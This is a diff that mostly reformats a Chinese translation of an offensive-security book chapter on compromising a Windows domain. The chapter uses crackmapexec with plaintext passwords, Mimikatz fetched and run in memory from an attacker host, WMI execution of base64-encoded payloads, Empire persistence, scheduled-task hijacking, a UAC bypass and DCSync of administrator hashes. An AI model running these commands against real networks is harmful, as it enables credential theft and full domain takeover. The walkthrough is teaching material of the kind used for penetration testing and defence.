@@ -52,7 +52,6 @@ Windows 定义了两类用户可以连接到域：
 在我们控制的任一台服务器上，运行一个简单的netstat命令来列出所有已建立的IP连接。
 
 ```text
-
 FrontGun$ proxychains crackmapexec -u Administrator - p M4ster_@dmin_123 -d WORKGROUP 192.168.1.70 - x "netstat -ano | findstr ESTABLISHED"
 ```
 
@@ -71,7 +70,6 @@ IP 10.10.20.118 显然不属于DMZ区。让我们试一试这个IP段。作为�
 首先，为缩小目标机的范围，我们启动nmap去扫描开放了445端口的目标主机。经验表明3389端口很有用是，所以也添加了进来。
 
 ```text
-
 FrontGun$ Proxychains nmap -n -p455,3389 10.10.20.0/24
 Starting Nmap 7.00 ( https://nmap.org ) at 2016-12-26 22:56 CET
     Nmap scan report for 10.10.20.27 
@@ -104,7 +102,6 @@ Starting Nmap 7.00 ( https://nmap.org ) at 2016-12-26 22:56 CET
 在我们拿到的所有帐户中，**svc\_mnt** 看起来最有希望。它看起来像是一个用于管理某种应用程序的服务帐户。因此，相比其他账户，它在其他服务器上被创建的可能性更高。我们使用该帐户启动 CME：
 
 ```text
-
 FrontGun$ proxychains crackmapexec -u svc_mnt -p Hello5\!981 -d WORKGROUP 10.10.20.27 10.10.20.90 10.10.20.97 10.10.20.118 10.10.20.210
 ```
 
@@ -125,7 +122,6 @@ UAC 是 Windows vista 中引入的一个功能，在执行特权操作\(软件�
 然后，我们编写一个小脚本，下载一个powershell版的Mimikatz，只在内存中通过IEX\(Invoke-Expression\)命令运行。
 
 ```text
-
 $browser = New-Object System.Net.WebClient
 
 $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredential
@@ -138,7 +134,6 @@ Invoke-Mimikatz
 我们打开具有管理权限的命令提示符（右键单击&gt;以管理员身份运行），然后执行脚本:
 
 ```text
-
 10.10.20.118 > powershell -exec bypass .\letmein.ps1
 ```
 
@@ -191,14 +186,14 @@ invoke-mimikatz -Computer FRSV27,FRSV210,FRSV229,FRSV97 |out-file result.txt -Ap
 
 ![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-4.jpg)
 
-你看！我们已经拿到 60 多个密码啦。我们注意到了一个“可疑”账号**adm\_supreme**，它可能具备特殊权限。然后，我们查询"domain admins"组进一步确认： 
+你看！我们已经拿到 60 多个密码啦。我们注意到了一个“可疑”账号**adm\_supreme**，它可能具备特殊权限。然后，我们查询"domain admins"组进一步确认：
 
 ![xx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.3-5.jpg)
 
 **adm\_supreme**确实属于"domain admins"组。搞定！
 
 {% hint style="info" %}
-提示：查询域资源（组，用户等）时，请记住必须使用有效的域帐户。在上面的屏幕中，在执行 “net group” 命令之前，我们使用adm_supreme 帐户重新连接到10.10.20.118。
+提示：查询域资源（组，用户等）时，请记住必须使用有效的域帐户。在上面的屏幕中，在执行 “net group” 命令之前，我们使用adm\_supreme 帐户重新连接到10.10.20.118。
 {% endhint %}
 
 {% hint style="success" %}
@@ -211,37 +206,43 @@ invoke-mimikatz -Computer FRSV27,FRSV210,FRSV229,FRSV97 |out-file result.txt -Ap
 我们一步一步分析如何来实现：
 
 1. 稍微更改以前的代码，将目标的 IP 地址包含在输出的文件名中:
-```ps
-$browser = New-Object System.Net.WebClient
-IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"))
-$machine_name = (get-netadapter | get-netipaddress | ? addressfamily -eq "IPv4").ipaddress 
-invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"
-```
+
+   ```text
+   $browser = New-Object System.Net.WebClient
+   IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"))
+   $machine_name = (get-netadapter | get-netipaddress | ? addressfamily -eq "IPv4").ipaddress 
+   invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"
+   ```
 
 2. 将所有的换行符更改为“;”，然后将此脚本放入 PowerShell 脚本的变量中：
-```ps
-PS > $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
-```
+
+   ```text
+   PS > $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
+   ```
 
 3. 对这个变量进行base64编码，并定义要定位的机器：
-```ps
-PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
-PS> $encodedCommand = [Convert]::ToBase64String($bytes)
-PS> $PC_IP = @("10.10.20.229", "10.10.20.97")
-```
+
+   ```text
+   PS> $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+   PS> $encodedCommand = [Convert]::ToBase64String($bytes)
+   PS> $PC_IP = @("10.10.20.229", "10.10.20.97")
+   ```
 
 4. 然后，我们准备启动 WMI 循环，该循环生成带有先前 base64 代码作为参数传递的PowerShell：
-```ps
-PS> invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
-```
+
+   ```text
+   PS> invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell - encodedcommand $encodedCommand")
+   ```
 
 5. 最后，我们把导出的文件移到我们目标机 10.10.20.118：
-```ps
-PS> move-item -path "\\$X\C$\windows\temp\$X.txt" - Destination C:\users\Administrator\desktop\ -force
-```
+
+   ```text
+   PS> move-item -path "\\$X\C$\windows\temp\$X.txt" - Destination C:\users\Administrator\desktop\ -force
+   ```
 
 以下是完整的脚本代码，和一段附加代码，该代码段将等到远程进程结束后才检索结果:
-```ps
+
+```text
 $command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"));$machine_name = (get-netadapter | get- netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
 
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
@@ -276,7 +277,7 @@ ForEach ($X in $PC_IP) {
 
 随便选一台目标主机进行交互，列出有关环境的基本信息：
 
-```shell
+```text
 (Empire) > interact D1GAMGTVCUM2FWZC
 (Empire: D1GAMGTVCUM2FWZC) > sysinfo
     Listener:    http://<front-gun>:80 
@@ -294,20 +295,21 @@ ForEach ($X in $PC_IP) {
 
 在每次重新登录时，Windows 都会查找一些注册表项，并直接运行对应的程序。我们将从中选择一个注册表键值来存储一段 PowerShell 脚本，这样 Mike 每次重新启动电脑后都会自动回连。
 
-```shell
+```text
 (Empire:mike)> usemodule persistence/userland/registry
 (Empire : persistence/userland/registry) > set Listener test
 (Empire : persistence/userland/registry) > run
 ```
 
 这个特殊的模块使用 RUN 键来实现持久化（HKCU\Software\Microsoft\Windows\CurrentVersion\Run），这种方法已经被无数恶意软件玩烂了。这远不是我们所能想出的最隐秘的方法，但鉴于当前在工作站上的权限不足，暂时还没法使用一些“风骚”的方法。
+
 {% hint style="info" %}
 提示：只需更改模块中的目标选项“set target XXXXX”，就可以在其他所有代理上直接执行此模块。
 {% endhint %}
 
 现在，我们已经涵盖了这一点，我们希望锁定一些在域内看起来具备管理员权限的用户，或者至少具有对某些服务器的访问权。一个典型的目标就是IT支持部门，我们通过 AD 列出该部门的所有员工：
 
-```
+```text
 (Empire: mike) > usemodule situational_awareness/network/powerview/get_user
 (Empire: mike) > set filter department=IT* 
 (Empire: mike) > run
@@ -382,9 +384,10 @@ Job started: Debug32_m71k0
     Run As User:    Users
     Schedule Type:    At logon time
 ```
+
 有点意思，管理员设置了定时任务，在用户每次登陆时更新屏幕保护程序。这是一个简单的“launcher.bat”脚本，位于“c: apps\screensaver\”目录。让我们看看该文件夹的访问权限列表：
 
-```shell
+```text
 (Empire: john) > shell icacls c:\apps\screensaver 
 (Empire: john) >
 c:\apps\screensaver BUILTIN\Administrators:(F) 
@@ -397,7 +400,7 @@ c:\apps\screensaver BUILTIN\Administrators:(F)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-太好了！所有用户对目录“ C:\Apps\screensaver \”都具备完全控制权限（“ F”权限）。我们可以通过将“launcher.bat”文件替换为自己的脚本，来达到劫持计划任务的目的。例如，编写一个脚本，运行 Mimikatz 并将密码转储到本地文件（c:\users\john\appdata \local\temp\pass_file.txt）。
+太好了！所有用户对目录“ C:\Apps\screensaver \”都具备完全控制权限（“ F”权限）。我们可以通过将“launcher.bat”文件替换为自己的脚本，来达到劫持计划任务的目的。例如，编写一个脚本，运行 Mimikatz 并将密码转储到本地文件（c:\users\john\appdata \local\temp\pass\_file.txt）。
 
 跟之前一样，将这段代码用base64编码，具体步骤这里不再赘述：
 
@@ -409,11 +412,11 @@ PS>    $encodedCommand    = [Convert]::ToBase64String($bytes)
 PS> write-host $encodedCommand JABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A
 ```
 
-以下是脚本“ launcher_me.bat”的内容，该脚本最终在 John 的终端上运行： `Powershell.exe -NonI -W Hidden -enc JABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A`
+以下是脚本“ launcher\_me.bat”的内容，该脚本最终在 John 的终端上运行： `Powershell.exe -NonI -W Hidden -enc JABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A`
 
 通过 Empire 将该脚本上传到目标文件夹：
 
-```shell
+```text
 (Empire: john) > shell cd c:\apps\screensaver\
 (Empire: john) > upload /root/launch_me.bat
 ```
@@ -427,7 +430,7 @@ PS> write-host $encodedCommand JABiAHIAbwB3AHMAZQByACAAPQAgAE4AZQB3A
 
 接下来就是等待了；可能时几个小时，也可能是一两天。最终，当 John 再次登录\[72\]时，就能拿到我们要的文件了（当然，还要清理一些无关数据）：
 
-```shell
+```text
 (Empire: john2) > shell download c:\users\john\appdata\local\temp\pass_file.txt 
 (Empire: john2) > shell del launcher.bat 
 (Empire: john2) > shell move launcher_old.bat launcher.bat
@@ -469,12 +472,11 @@ kerberos :
     […]
 ```
 
-不错！看来计划任务确实以 adm_supreme 用户权限执行了：
- ![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-2.jpg)
+不错！看来计划任务确实以 adm\_supreme 用户权限执行了： ![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-2.jpg)
 
 使用新获得的凭据在工作站上创建一个新的管理会话。
 
-```
+```text
 (Empire:) > usemodule management/spawnas
 (Empire:    management/spawnas)    >    set    UserName adm_supreme
 (Empire: management/spawnas) > set Domain SPH 
@@ -491,9 +493,9 @@ Id SI ProcessName
 
 ![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-3.jpg)
 
-新的 adm_supreme 会话在工作站上依然权限受限（UAC 还是会弹出）。如果想执行提权操作，例如设置更隐蔽的持久化方法，监视 John 等，还需要有更高的权限来绕过UAC：
+新的 adm\_supreme 会话在工作站上依然权限受限（UAC 还是会弹出）。如果想执行提权操作，例如设置更隐蔽的持久化方法，监视 John 等，还需要有更高的权限来绕过UAC：
 
-```shell
+```text
 (Empire: admSupreme) > usemodule privesc/bypassuac_eventvwr
 (Empire: privesc/bypassuac_eventvwr) > set Listener test
 (Empire: privesc/bypassuac_eventvwr) > run
@@ -502,8 +504,7 @@ Job started: Debug32_23tc3
 
 ![xxx&#x793A;&#x610F;&#x56FE;](.gitbook/assets/4.4-4.jpg)
 
-adm_supreme 用户名前的小星星表明提权成功。
-在我们亲爱的adm\_supreme的用户名前面的小星星意味着它是一个提升的会话。我们可以使用此会话在工作站上设置持久化和其他特权操作。
+adm\_supreme 用户名前的小星星表明提权成功。 在我们亲爱的adm\_supreme的用户名前面的小星星意味着它是一个提升的会话。我们可以使用此会话在工作站上设置持久化和其他特权操作。
 
 ## 4.5 更多密码
 
@@ -515,7 +516,7 @@ adm_supreme 用户名前的小星星表明提权成功。
 
 下面的命令会请求域管理员的密码哈希值：
 
-```
+```text
 PS> $browser = New-Object System.Net.WebClient
 PS> IEX($browser.DownloadString("http://192.168.1.90:443/Mimikatz.ps1"))
 PS> invoke-mimikatz -Command '"lsadump::dcsync/domain:sph.corp /user:administrator"'
@@ -527,6 +528,5 @@ PS> invoke-mimikatz -Command '"lsadump::dcsync/domain:sph.corp /user:administrat
 
 提示:一种有趣的持久化技术是生成黄金票据\(Kerberos票据，有效期为10年\)。查看:[http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos。](http://blog.gentilkiwi.com/securite/mimikatz/golden-ticket-kerberos。)
 
-> 翻译：Regina9Li 2019/10/27
-> 校对：xncoder 2019/11/25
+> 翻译：Regina9Li 2019/10/27 校对：xncoder 2019/11/25
 
